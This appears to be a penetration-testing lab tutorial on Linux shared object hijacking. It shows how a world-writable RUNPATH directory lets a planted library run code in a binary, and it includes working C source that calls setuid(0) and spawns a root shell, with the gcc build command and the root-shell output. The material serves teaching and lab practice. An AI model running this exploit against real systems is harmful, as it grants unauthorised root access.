# Shared Object Hijacking

In the case where we see a strange dependency when running `ldd`, we can check the `RUNPATH` configuration.

```bash
$ readelf -d payroll | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
$ ls -al /development/

total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
```

Before compiling a library, we need to find the function name called by the binary. Lets copy a basic library as a placeholder for now.

```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

```bash
$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)

$ ./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

We can copy an existing library to the `development` folder. Running `ldd` against the binary lists the library's path as `/development/libshared.`so, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named `dbquery`. We can compile a shared object which includes this function.

src.c

```c
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```

Executing the binary now pops a shell!

```bash
$ ./payroll 

***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```
